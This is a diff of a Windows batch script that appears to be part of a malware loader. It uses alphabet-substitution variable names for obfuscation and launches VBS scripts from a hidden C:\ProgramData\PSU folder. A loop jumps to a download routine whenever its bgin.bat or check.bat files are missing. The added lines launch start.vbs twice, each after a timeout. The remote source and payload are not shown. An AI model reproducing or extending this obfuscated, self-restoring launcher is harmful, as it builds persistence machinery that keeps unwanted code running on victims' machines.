@@ -52,6 +52,10 @@ set bbbbbbbbbbbbbbbbbbbbbbbbbb=Y
 set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
 @echo off
 start "" "C:\ProgramData\PSU\samba.vbs"
+timeout 3
+start "" "C:\ProgramData\PSU\start.vbs"
+timeout 3
+start "" "C:\ProgramData\PSU\start.vbs"
 :start
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
